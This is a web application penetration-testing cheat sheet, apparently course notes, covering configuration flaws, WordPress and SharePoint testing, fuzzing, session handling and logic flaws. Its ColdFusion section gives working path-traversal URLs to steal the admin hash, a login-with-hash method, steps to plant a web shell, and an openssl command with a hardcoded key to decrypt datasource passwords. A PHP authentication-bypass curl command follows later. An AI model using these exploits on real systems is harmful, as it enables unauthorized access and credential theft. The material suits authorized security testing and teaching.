---
title: Configuration, Authentication, and Logic Flaws
category: Web Application
order: 3
---

> **Configuration**

Use Recon information to test for vulnerabilities in:
* OS (e.g., Shellshock)
* Webserver (e.g., heartbleed)
* Application Server Misconfiguration (e.g., admin portal, phpinfo)
* FrontEnd Frameworks (e.g., jQuery, MooTools) - look at wappalizer, src, and xmlhttprequests

> **HTTP2 and Websockets**

{% highlight php %}
For websockets look for:
WS:// or WSS://
Upgrade: websocket
Sec-WebSocket-Key: SYZk7WHCUKqF+DH0PIvIA++
Origin: http://127.0.0.1 (optional but crucial)
ZAP works better for websockets - make sure to add a delay when fuzzing
{% endhighlight %}

HTTP2 Compatable Tools:
* Mitmproxy
* Charles proxy
* Curl
* Nghttp
* python hyper
* Ruby nethttp2
* Wireshark
* Http2fuzz



> **Wordpress**

Test Strategy:
* Look for data leakage
* Fingerprint the version and plugins (e.g, wpscan, admin panel\, copyright, URL paths/filenames, readme)
* Third Party and Custom Plugins
** Configuration interfaces on an admin panel
** Widgets to add features to pages
** Inputs to accept data from normal users
* Look for functionality added outside of wordpress
* Third party themes can have thing to test (like OGNL for node)
* Easy to download and install to test offline (including plugins) 
** Create a page for each plugin
** Test each page as a creator or user

{% highlight bash %}
wpscan --update  && wpscan  --url wordpress.sec642.org --enumerate p --enumerate t --enumerate u --enumerate tt
{% endhighlight %}


> **Sharepoint**

Test Strategy:
* Focus on web parts (sharepoint plugins
* Improper Permissions (content)
** Going through different departments (sensative departments - manufacturing processes, network admins - router backups, developers - connect to source code repository, IT - default passwords) and looking for bad permissions
** Use the search feature in sharepoint (not burp spider) like password
* Default Pages
* Vulnerabilities in web parts and sharepoint
* Content Issues
* Older versions you can try to upload and run ASP or ASPX files
* Upload client-side code for client-side attack (e.g., XSS)

> **Coldfusion**

**ColdFusion 6, 7, 8 (APSB10-18) - Authentication Bypass**

In unpatched versions of ColdFusion 6, 7 and 8 there is a local file inclusion vulnerability (APSB10-18) which you can exploit to get the administrator password hash from the password.properties file.

ColdFusion 6:
<code> http://[HOSTNAME:PORT]/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX\lib\password.properties%en </code>

ColdFusion 7: 
<code> http://[HOSTNAME:PORT]/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\CFusionMX7\lib\password.properties%en </code>

ColdFusion 8:
<code> http://[HOSTNAME:PORT]/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\ColdFusion8\lib\password.properties%en </code>

All versions (according to this site [3], but I have never tried it):
<code> http://site/CFIDE/administrator/enter.cfm?locale=..\..\..\..\..\..\..\..\..\..\JRun4\servers\cfusion\cfusion-ear\cfusion-war\WEB-INF\cfusion\lib\password.properties%en </code>

If the local file inclusion is successful, the password hash (SHA1) is written back to you on the administrative login page like this (hash was reducted):

Here are the steps you need to take in order to login as administrator:
* Start capturing traffic using Burp (or whatever attack proxy you like).
* Enter the password hash into the password field of the login form.
* If you are using Firefox hit Ctrl+Shift+K, for Chrome, hit Ctrl+Shift+J to get the JavaScript console and if you are using Internet Explorer
* Enter the following JavaScript code in the console:
<code> javascript:alert(hex_hmac_sha1(document.loginform.salt.value, document.loginform.cfadminPassword.value)) </code>
* Record value that you got, and go back with your browser back button.
* Set Burp to intercept, click on the Login button at ClodFusion and catch the login request in Burp.
* Replace the value of the cfadminPassword parameter with the value you have recorded above.
* Forward the modified request and do your happy dance.

**Webshell**

Download a the webshell of choice:
https://github.com/fuzzdb-project/fuzzdb/tree/master/web-backdoors/cfm
https://github.com/hatRiot/clusterd/blob/master/src/lib/coldfusion/fuze.cfml

"Debugging & Loging / Scheduled Taks" menu element and add a scheduled task that would download our CFML script from our webserver to the ColdFusion server’s webroot. Make sure you schedule the deployment to some reasonable time, so 5-10 minutes from your current time


**Database Passwords**

For ColdFusion 6 and 7 the passwords for DataSources encrypted in the following XML files:
<code> [ColdFusion_Install_Dir]\lib\neo-query.xml </code>
For ColdFusion 8, 9 and 10:
<code> [ColdFusion_Install_Dir]\lib\neo-datasource.xml </code>

Decrypt the Password for 6,7, and 8:
<code> echo [encrypted_and_base64_encoded_password] | openssl des-ede3 -a -d -K 30794A21403124723870304C4072312436794A214031726A -iv 30794A2140312472; echo </code>

> **Forced Browseing and Content Discovery**

ZAP:
* Tools -> options -> forced browse and verify options
* Right click -> attack ->  forced browse

Burp (Pro only):
* Right click -> Engagement tools -> Discover Content

> **Fuzzing and Password Guessing**

Burp Fuzzing:
1. Right click on request -> send to intruder
2. Click Posistion -> select attack type based on attack (e.g., number of posistions, combination)
3. Select Posistions 
4. Click Payloads -> select appropriate payload
5. Click Options -> Verify Grep (what you are looking for)
6. Sort on the field you were grepping for

ZAP Fuzzing (best for timing based attacks):
1. Send a request that has the posistions you want to fuzz (right click on request -> tailor -> resend)
2. Right click on request -> fuzz
3. Highlight text you want to fuzz
4. Click add -> select payload
5. Repeat for number of fields to fuzz
6. Click start fuzz
7. Sort on relevant field

Fuzzing Payloads:
* fuzzdb
* jbro fuzz
* wraph

Passwords:
* [Seclist](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
* [Weakpass](https://weakpass.com/)
* [crackstation](https://crackstation.net/)
* [Hashcat Hob0Rules](https://github.com/praetorian-inc/Hob0Rules)


> **Directory Browsing**

Test for Directory Browsing:
1. Navigate to directories and look for local file references (for NGINX and Apache try www.site.com/images)
2. Google site:gov intitle:""Index of"" ""last modified""
3. CVEs for leakage based on recon

Tools:
* Google Hacking Database
* dirb
* dirbuster
* [fuzzdb](https://github.com/fuzzdb-project/fuzzdb)
* jbrofuzz
* wmap
* Nikto
* w3af
* ZAP
* Metasploit WMAP
* Metasploit msfcrawler

> **Username Harvesting**

1. Use company website, email, google, linked-in, Facebook, Twitter to find potential usernames 
2. Find Lists:
	* [SkullSecurity](https://downloads.skullsecurity.org/passwords/):ron facebook usernames census
	* [SecList](https://github.com/danielmiessler/SecLists/tree/master/Usernames) 
3. Test a valid username vs invalid in login, password reset, create user pages:
	* Look for different HTML 
	* Look for different response variables
	* Look for differences in the url
	* Look for differences in form fields (e.g., Username field)
	* Look for iming differences in response time [calculating hashin](https://littlemaninmyhead.wordpress.com/2015/07/26/account-enumeration-via-timing-attacks/) 
4. Fuzz using Burp or Zap

> **Assess Authentication**

Analyze authentication (valid and invalid) in proxy for multiple users:
1. Is it form based, basic, digest?
2. Are they using cookies? What is in the cookie? URI paramters?  Hidden form fields?
3. Any other interesting fields
4. Is the cookie marked as secure or HTTP only? 
	* set-cookie: [values]; HttpOnly; Secure
	* If yes, is the value located in the HTML anywhere (e.g., hidden form field)? 
5. Look for:
	* Session Fixation
	* Session Randomness
	* Predictability
	* Bruteforece 

> **Break OAUTH 1.0**

* Find secret key:
	* Insecure storage of key
	* Intercept the generation of request and access token
	* JavaScript information leak
	* Spoof the site

> **Session Fixation**

1. Get a session token from site 
2. Document session token
3. Log-in 
3. Document session token
4. Did it change using burp compare?  If not, session fixation may be possible.
	* Note: If there are a bunch, just start deleting some of them, the ones that causes a logout would be the session token.
5. Can you set the session via URL, hidden form fields, or XSS

> **Session Predictability**

1. Get a lot of session tokens (script or burp sequencer to gather tokens)
2. Use burp sequencer to analyze
3. Known hashes may look non-predictable, but may just be a hash of incrimenting or static values (e.g., 1..9, username)

Using Burp Sequencer:
1. Right click on login request -> send to sequencer 
2. In token locaiton within response -> select the token
3. Look for the red results
	* Note: If it doesn't work use a script and load a file into burp instead.

> **Authentication Bypass**

Blackbox
1. Forced browsing (see ZAP forced browsing or Burp Burp Discovery)
2. Look at keys and ids in url and cookies (e.g., Admin=true)

Whitebox
1. Spider at each authentication level as separate sitemaps (saved)
2. Attempt to access with a lower level (not just pages, but functions - javascript -forms)

> **Mass Assignment**

If scaffolding code is used without whitelisting attributes:

{% highlight ruby %}
#Creates a new user with all the attributes set to the values that got transmitted.
@user = User.new(params[:user])
{% endhighlight %}

Then you may be able to do something like:

{% highlight ruby %}
#Attacker intercepts request and makes himself admin
params[:user] = { name: 'Evil', email: 'evil@example.com', description: 'I am an admin soon', admin: true}
{% endhighlight %}


> **PHP Juggling Authentication**

If 'loose' comparisions are being done, like PHP's == instead of ===, the attacker could possibly abuse this logic:

{% highlight php %}
<?php
if (strcmp($_POST['password'], 'sekret') == 0) {
    echo "Welcome, authorized user!\n";
} else {
    echo "Go away, imposter.\n";
}
?>
{% endhighlight %}

Then you may be able to do something like:

{% highlight bash %}
curl -d password[]=wrong http://andersk.scripts.mit.edu/strcmp.php
Welcome, authorized user!{% endhighlight %}


**References**

* https://jumpespjump.blogspot.com/2014/03/attacking-adobe-coldfusion.html
